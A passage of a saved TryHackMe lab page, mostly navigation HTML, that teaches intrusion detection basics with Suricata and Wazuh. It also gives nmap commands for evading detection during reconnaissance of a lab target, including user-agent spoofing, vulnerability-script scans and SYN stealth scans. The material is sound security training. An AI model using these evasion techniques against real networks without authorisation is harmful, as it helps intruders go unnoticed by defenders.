+                            let usersStreak = { // Global variable, used in rooms logic
+                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
+                                streakLastAnswered: new Date('Sun Jul 16 2023 18:47:44 GMT+0100 (British Summer Time)'),
+                                usersTimezone: 'Asia/Kolkata',
+                                streakFreeze: 1
+                            };
+                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
+                        </script>
+</div>
+</li>
+<li class="nav-item dropdown" id="notification-navitem">
+<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/idsevasion#" id="notification-btn" role="button" data-toggle="dropdown">
+<i id="notification-icon" class="fal fa-bell"></i>
+<div id="notification-dot"></div>
+</a>
+<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
+<div id="notification-header">Notifications</div>
+<div id="nav-notifications">
+<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
+</div>
+</div>
+</li>
+<li class="nav-item dropdown">
+<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/idsevasion#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+<img src="./TryHackMe _ Intrusion Detection_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
+</a>
+<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
+<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
+<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
+<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
+<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
+<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
+<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
+<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
+</div>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<link rel="stylesheet" href="./TryHackMe _ Intrusion Detection_files/streak-freeze.css">
+<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+<div class="modal-body">
+<figure>
+<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Intrusion Detection_files/streak-freeze.svg">
+</figure>
+<h2>You've unlocked a streak freeze!</h2>
+<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
+</div>
+</div>
+</div>
+</div>
+<script src="./TryHackMe _ Intrusion Detection_files/streak-freeze.js"></script>
+<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
+<header>
+<a href="https://tryhackme.com/" aria-label="Go to the home page">
+<img width="140" src="./TryHackMe _ Intrusion Detection_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
+</a>
+<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
+<i class="fal fa-times"></i>
+</button>
+</header>
+<ul class="thm-mobile-nav-items mb-0">
+<li class="nav-item ">
+<a class="nav-link" href="https://tryhackme.com/dashboard">
+<i class="nav-title-icon far fa-browser"></i>
+<div class="nav-title">Dashboard</div>
+</a>
+</li>
+<li class="nav-item active">
+<a class="nav-link" href="https://tryhackme.com/hacktivities">
+<i class="nav-title-icon far fa-book-open"></i>
+<div class="nav-title">Learn</div>
+</a>
+</li>
+<li class="nav-item ">
+<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
+<i class="nav-title-icon far fa-trophy"></i>
+<div class="nav-title">Compete</div>
+<i class="far fa-angle-down"></i>
+</a>
+<div id="mobile-nav-compete" class="dropdown-wrapper">
+<a href="https://tryhackme.com/leaderboards">
+<div>
+<i class="fas fa-trophy"></i>
+</div>
+<div>
+<span class="mb-0">Leaderboards</span>
+<div class="text-lgray size-12">Platform Rankings</div>
+</div>
+</a>
+<a href="https://tryhackme.com/games/koth">
+<div>
+<i class="fas fa-crown"></i>
+</div>
+<div>
+<span class="mb-0">King of the Hill</span>
+<div class="text-lgray size-12">Attack &amp; Defend</div>
+</div>
+</a>
+<a href="https://tryhackme.com/workspace">
+<div>
+<i class="fas fa-user-friends"></i>
+</div>
+<div>
+<span class="mb-0">Workspace</span>
+<div class="text-lgray size-12">Compete &amp; Collaborate</div>
+</div>
+</a>
+</div>
+</li>
+<li class="nav-item">
+<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
+<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
+<div class="nav-title">Other</div>
+<i class="far fa-angle-down"></i>
+</a>
+<div id="mobile-nav-other" class="dropdown-wrapper">
+<a href="https://tryhackme.com/resources">Resources</a>
+<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
+<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
+<a href="https://tryhackme.com/business">For Business</a>
+<a href="https://tryhackme.com/classrooms">For Education</a>
+<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
+</div>
+</li>
+<li class="nav-item text-center">
+<div class="nav-item-streak">
+<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;
+
+&lt;div class=&#39;size-12 faded&#39;&gt;
+  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
+    Access to networks, Streak freeze&lt;/p&gt;
+  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
+    Streak freeze&lt;/p&gt;
+  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
+&lt;/div&gt;
+ &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
+        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
+<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
+</span>
+</div>
+</li>
+<li class="nav-item text-center">
+<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/idsevasion#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
+<i id="mobile-notification-icon" class="fal fa-bell"></i>
+<div id="mobile-notification-dot"></div>
+</a>
+<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
+<div id="mobile-notification-header">Notifications</div>
+<div id="mobile-nav-notifications">
+<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
+</div>
+</div>
+</li>
+<li class="nav-item text-center">
+<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
+<img src="./TryHackMe _ Intrusion Detection_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
+</a>
+<div id="mobile-nav-auth" class="dropdown-wrapper">
+<a href="https://tryhackme.com/profile">Profile</a>
+<a href="https://tryhackme.com/referrals">Refer a friend</a>
+<a href="https://tryhackme.com/badges">Badges</a>
+<a href="https://tryhackme.com/rooms">My Rooms</a>
+<a href="https://tryhackme.com/access">Access</a>
+<a href="https://tryhackme.com/feedback">Give Feedback</a>
+<a href="https://tryhackme.com/logout">Logout</a>
+</div>
+</li>
+</ul>
+</nav>
+<script defer="" src="./TryHackMe _ Intrusion Detection_files/mobile-nav.js"></script>
+<script>
+  const userSignedUpLessThanSevenDaysAgo = Math.floor(
+    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
+  );
+
+  const userHasFirst4RoomsBadge = !!``;
+  const isBeginner = `advanced` === 'complete-beginner';
+</script>
+<script src="./TryHackMe _ Intrusion Detection_files/notifications.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/streak-freeze(1).js"></script>
+<div id="wrapper">
+<div id="room-banner" class="shadow-light">
+<img id="room-image-large" src="./TryHackMe _ Intrusion Detection_files/bannerhq.png">
+<div>
+<div id="room-details">
+<div class="container">
+<div class="page-header">
+<div class="room-header">
+<div id="room-voting" class="text-center vertical-align-custom">
+<div class="voting-buttons">
+<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
+<div class="display-block" id="vote-number">196</div>
+<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
+</div>
+</div>
+<div id="room-logo" class="vertical-align-custom">
+<div id="logo"><img class="room-avatar" src="./TryHackMe _ Intrusion Detection_files/9f5785fc9979f57ec0df40f2f06d8f2b.png" onerror="replaceImg(this)"></div>
+</div>
+<div class="vertical-align-custom">
+<div id="room-basic-data">
+<div class="d-flex justify-content-between">
+<h1 id="title" class="bold-head">Intrusion Detection </h1>
+<div id="room-title-options">
+
+<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
+<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
+<div class="btn-group" id="browser-machines" role="group">
+<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
+<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
+<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/idsevasion#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
+<span class="mb-0">Use Kali Linux</span>
+<div class="text-lgray size-12">Web-based Kali Machine</div>
+</a>
+<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/idsevasion#" onclick="changeMyMachine(&quot;attackbox&quot;)">
+<span class="mb-0">Use AttackBox</span>
+<div class="text-lgray size-12">Recommended</div>
+</a>
+</div>
+</div>
+</div>
+<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
+<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
+<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
+<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
+Help
+</span>
+<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
+<span class="badge badge-secondary" data-toggle="dropdown">
+<i class="fas fa-cog"></i>
+</span>
+<div class="dropdown-menu">
+<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/idsevasion" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
+<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
+<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
+<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
+</div>
+</div>
+<span id="bookmark" class="badge badge-secondary badge-bookmark ">
+<img class="bookmark" src="./TryHackMe _ Intrusion Detection_files/bookmark.svg">
+<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
+" data-original-title="" title="">
+</span>
+</span>
+</div>
+</div>
+<p class="mb0 faded" id="description">Learn cyber evasion techniques and put them to the test against two IDS</p>
+</div>
+</div>
+</div>
+</div>
+
+</div>
+</div>
+<div id="room-banner-stats">
+<div class="creators"></div>
+<div class="numbers"></div>
+</div>
+</div>
+</div>
+<div class="container main pb">
+<div id="room-message"></div>
+<section id="sponsor">
+<i id="sponsor-close" class="fas fa-times"></i>
+<div id="sponsor-data"></div>
+</section>
+<div id="top-panel">
+<ul class="nav nav-tabs" id="task-navs">
+<li class="nav-item">
+<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/idsevasion#chart">
+<i class="fas fa-chart-line icon-right"></i> Chart
+</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/idsevasion#scoreboard">
+<i class="fas fa-trophy icon-right"></i> Scoreboard
+</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/idsevasion#chat">
+<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
+</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/idsevasion#writeups">
+<i class="fas fa-pen-alt icon-right"></i> Writeups
+</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/idsevasion#about">
+<i class="fas fa-info-circle icon-right"></i> More
+</a>
+</li>
+</ul>
+<div class="card cd-2 nav-above-con" id="room-main">
+<div class="card-body">
+<span id="room-tabs">
+<div class="tab-content">
+<div id="chart" class="tab-pane  active ">
+<span id="difficulty-bar">
+    <span class="room-difficulty diff-text">
+      Difficulty: 
+        <span class="difficulty-medium">Medium</span>
+    </span></span>
+<br><div id="chart-data"></div>
+</div>
+<div id="scoreboard" class="tab-pane fade">
+<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
+<thead>
+<tr id="scoreboard_header">
+<th>Rank</th>
+<th>Username</th>
+<th>Total Score</th>
+</tr>
+</thead>
+<tbody id="scoreboard_body"></tbody>
+</table>
+</div>
+<div id="chat" class="tab-pane fade">
+
+<div class="row">
+<div class="col-sm-6 text-center">
+<h3 class="mb-2">Discord</h3>
+<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
+</div>
+<div class="col-sm-6 text-center">
+<h3 class="mb-2">Forum</h3>
+<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/62570fa0d2607c8db142c81d">post</a></div>
+</div>
+</div>
+</div>
+<div id="writeups" class="tab-pane text-center">
+<div id="writeups-data">There are no writeups submitted.</div>
+<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
+<div id="writeup-form">
+<div class="form-row">
+<div class="col-auto">
+<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
+ </div>
+<div class="col-auto">
+<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
+</div>
+<div class="col-auto">
+<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
+</div>
+</div>
+<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
+</div>
+</div>
+<div id="about" class="tab-pane text-center">
+<p id="about-freeRoom"><p class="mb-0">This is a <b>free</b> room, which means anyone can deploy virtual machines in the room 
+        (without being subscribed)! 3211 users are in here and this room is 460 days old.</p></p>
+<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Intrusion Detection_files/dadf5f3f95a13ad0b921ea764d96b16b.png"> 
+        <a class="green-link" href="https://tryhackme.com/p/CoolComputerMan">CoolComputerMan</a></p></p>
+</div>
+</div>
+</span>
+</div>
+</div>
+</div>
+<div id="room-simple-video" class="card card-body cd-2"></div>
+<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
+<div class="card-header card-header-red">Active Machine Information</div>
+<div class="card-body">
+<div class="row vertical-align-custom">
+<div class="col-sm-3">
+<i>Loading...</i>
+</div>
+<div class="col-sm-3" id="table-machine-ip">
+<i>Loading...</i>
+</div>
+<div class="col-sm-3">
+<i>Loading...</i>
+</div>
+<div class="col-sm-3">
+<i>Loading...</i>
+</div>
+</div>
+</div>
+</div>
+<div id="task-list">
+<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-secondary" role="progressbar" style="width: 5%; aria-valuemin=" 0"="" aria-valuemax="100"> 0%</div></div></span></div>
+<div id="taskContent"><div class="card" id="task-1">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 1                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Introduction
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
+                        </a>
+                    </div>
+                    <div id="collapse1" class="collapse show" data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
+            <button type="button" class="btn btn-success" value="624d72e87a3006005c36ba29" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
+        </div> <p>Have you ever completed a CTF and wondered, "Would I have been detected?". This room will serve as an introduction to the world of intrusion detection systems (IDS) and cyber evasion techniques. To complete this room, you will need to orchestrate a full system takeover whilst experimenting with evasion techniques from all stages of the cyber kill chain.<br></p><p>This room also demonstrates the first public test of a new CTF scoring system designed to add additional interactivity, feedback, and re-playability to CTFs. In short, this system and several open source IDS can be combined to provide a per-user breakdown, and scoring of all the IDS alerts created during the course of a CTF.</p><p>You can access the system by navigating to&nbsp;<a href="http://machine_ip:8000/register" target="_blank">http://MACHINE_IP:8000/register</a><b>.&nbsp; <br></b></p><p><b>NOTE: </b>This room can take up to five minutes to be fully available, so you may not be able to register immediately. However, you can work through the first few tasks without complete access to the system. Also, make sure that you register an account before running any attacks.<br></p><p></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Deploy the target machine and create an account and log into the system at http://MACHINE_IP:8000, in preparation for future tasks.
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="1">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Completed
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-2">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 2                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Intrusion Detection Basics
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse2" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>Intrusion detection systems (IDS) are a tool commonly deployed to defend networks by automating the detection of suspicious activity. Where a firewall, anti-virus, or authorisation system may prevent certain activity from occurring on or against IT assets, an IDS will instead monitor activity that isn't restricted and sort the malicious from the benign. IDS commonly apply one of two different detection methodologies; Signature (or rule) based IDS will apply a large rule set to search one or more data sources for suspicious activity whereas, Anomaly-based IDS establish what is 
+considered normal activity and then raise alerts when an activity that does
+ not fit the baseline is detected. </p><p>Either way, once an incident is detected, the IDS will generate an alert and will then forward it further up the security chain to log aggregation or data <span>visualisation</span> platforms like&nbsp;<a href="https://www.graylog.org/products/open-source" target="_blank">Graylog</a> or the<a href="https://www.elastic.co/what-is/elk-stack" target="_blank"> ELK Stack</a>. Some IDS may also feature some form of intrusion prevention technology and may automatically respond to the incident.&nbsp;</p><p>Two signature-based IDS are attached to this demo; <a href="https://suricata.io/" target="_blank">Suricata</a>, a network-based IDS (NIDS), and<a href="https://wazuh.com/" target="_blank"> Wazuh</a>, a host-based IDS (HIDS). Both of these IDS implement the same overarching signature detection methodology; however, their overall behaviour and the types of attacks that they can detect differ greatly. We will cover the exact differences in more detail in the following tasks.<br></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>What IDS detection methodology relies on rule sets?<br></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *************** *********" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="2">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-3">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 3                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Network-based IDS (NIDS)
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse3" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p><img style="float:right;width:50%" class="note-float-right"></p><p><img alt="Example NIDS Delpyment" style="float:right;width:50%" src="./TryHackMe _ Intrusion Detection_files/99c87a32eb94a9a977d84022a8c51ece.png" class="note-float-right">As the name implies, network intrusion detection systems or NIDS monitor networks for malicious activity by checking packets for traces of activity associated with a wide variety of hostile or unwanted activity including:</p><ul><li>Malware command and control <br></li><li>Exploitation tools</li><li>Scanning<br></li><li>Data exfiltration </li><li>Contact with phishing sites<br></li><li>Corporate policy violations</li></ul><p>Network-based detection allows a single installation to monitor an entire network which makes NIDS deployment more straightforward than other types. However, NIDS are more prone to generating false positives than other IDS, this is partly due to the sheer volume of traffic that passes through even a small network and, the difficulty of building a rule set that is flexible enough to reliably detect malicious traffic without detecting safe applications that may leave similar traces. This can be alleviated somewhat, by tuning the IDS to only enforce rules that would be considered abnormal traffic for any particular network however, this does take some time as the IDS must be deployed on a network for a while in order to establish what traffic is normal. <br></p><p> NIDS can be deployed on both sides of the firewall though, they tend to be deployed on the LAN side as there is limited value in detecting attacks that occur against outside nodes as they will be under attack constantly. A NIDS may also feature some form of intrusion prevention (IPS) functionality and be able to block nodes that trigger a set number of alerts, this is not always enabled as automated blocking can conflict with a high false-positive rate. Note, that NIDS rely on having access to all of the communication 
+between nodes and are thus affected by the widespread adoption of in-transit encryption.<br></p><p>A variety of open source and proprietary NIDS exist, the node in this scenario is protected by the open source NIDS, Suricata. For this, demo the IPS mode is disabled so you are free to run as many attacks as you want. In fact, try and run some of your favourite tools against the target and see how the different IDS respond. A history of all the alerts generated during this room is available at http://MACHINE_IP:8000/alerts<br></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                What widely implemented protocol has an adverse effect on the reliability of NIDS?<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="3">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>Experiment by running tools against the target and viewing the resultant alerts. Is there any unexpected activity?<br></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="3">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Completed
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-4">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 4                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Reconnaissance and Evasion Basics
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse4" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>Now that the basics of NIDS have been covered, it's time to discuss some simple evasion techniques in the context of the first stage of the cyber kill chain, reconnaissance. First, run the following command against the target at MACHINE_IP<br></p><p><code>nmap -sV MACHINE_IP<br></code></p><p>I recommend completing this <a href="https://tryhackme.com/room/furthernmap" target="_blank">room</a> if you're unfamiliar with <code>nmap</code>. In simple terms, the above command will retrieve a detailed listing of the services attached to the targeted node by performing a number of predefined actions against the target. As an example, <code>nmap</code> will request long paths from HTTP servers to deliberately create 404 errors some HTTP servers will provide additional information when a 404 error is triggered. <br></p><p>The above command does not make use of any evasion techniques and as a result, most NIDS should be able to detect it with no issue, in fact, you should be able to verify this now by navigating to MACHINE_IP:8000/alerts. Suricata should have detected that some packets contain the default <code>nmap</code> user agent and triggered an alert. Suricata will have also detected the unusual HTTP requests that <code>nmap</code> makes to trigger responses from applications targeted for service versioning. Wazuh may have also detected the 400 error codes made during the course of the scan.<br></p><p>We can use this information to test our first evasion strategy. By appending the following to change the user_agent <code>http.useragent=&lt;AGENT_HERE&gt;</code>, we can set the user agent used by <code>nmap</code> to a new value and partially evade detection. Try running the command now, a big list of user agents is available<a href="https://developers.whatismybrowser.com/useragents/explore/" target="_blank"> here</a>. The final command should look something like this:</p><p><code>nmap -sV --script-args http.useragent="&lt;USER AGENT HERE&gt;" MACHINE_IP</code><br><br>Note, that this strategy isn't perfect as both Suricata and Wazuh are more than capable of detecting the activity from the aggressive scans. Try running the following <code>nmap</code> command with the new User-Agent:</p><p><code>nmap --script=vuln --script-args http.useragent="&lt;USER AGENT HERE&gt;" MACHINE_IP</code><br></p><p>The above command tells <code>nmap</code> to use the vulnerability detection scripts against the target that can return a wealth of information. However, as you may have noticed they also generate a significant number of IDS alerts even when specifying a different User-Agent as a <code>nmap</code> probes for a large number of potential attack vectors. It is also possible to evade detection by using <code>SYN (-sS)</code> or "stealth" scan mode; however, this returns much less information as it will not perform any service or version detection, try running this now:</p><p><code>nmap -sS MACHINE_IP</code><br></p><p>This is an important point as, in general, the more you evade an IDS the less information you will be able to retrieve. A good non-cyber analogue can be found in naval warfare with the use of active and passive sonar. If you were to helm a submarine and use active sonar to search for ships you may well be able to retrieve a lot of information about your opponents however, you would also allow your opponent to detect you just as easily as they could detect your active scans. </p><p>It is also important to also take note of the position of the target in relation to the network when performing reconnaissance. If the target asset is publicly accessible it may not be necessary to perform any evasion as it is highly likely that the asset is also under attack by a countless number of botnets and internet-wide scans and thus, the activity may be buried undersea by other attacks. On the other hand, publicly exposed assets may also be protected by rate-limiting tools like <code>fail2ban</code>. Scanning a site that is under the protection of such a tool is likely to result in your IP getting banned very quickly. <br></p><p>Conversely, if you're scanning an important database behind a corporate firewall that should never be accessed from the outside, a single IDS alert is likely to be the cause of some alarm. Note that, the scoring system does take this into account so the results you see for attacks against the target web server will be reduced when compared with the assets that will be attacked later in this room (the scoring system works somewhat like Golf so a higher score is worse).</p><p>We should also consider the exact definition of evasion as applied to IDS; it can either be complete, where no IDS alerts are triggered as a result of hostile actions, or, partial where an alert is triggered but, its severity is reduced. In some scenarios, complete evasion may 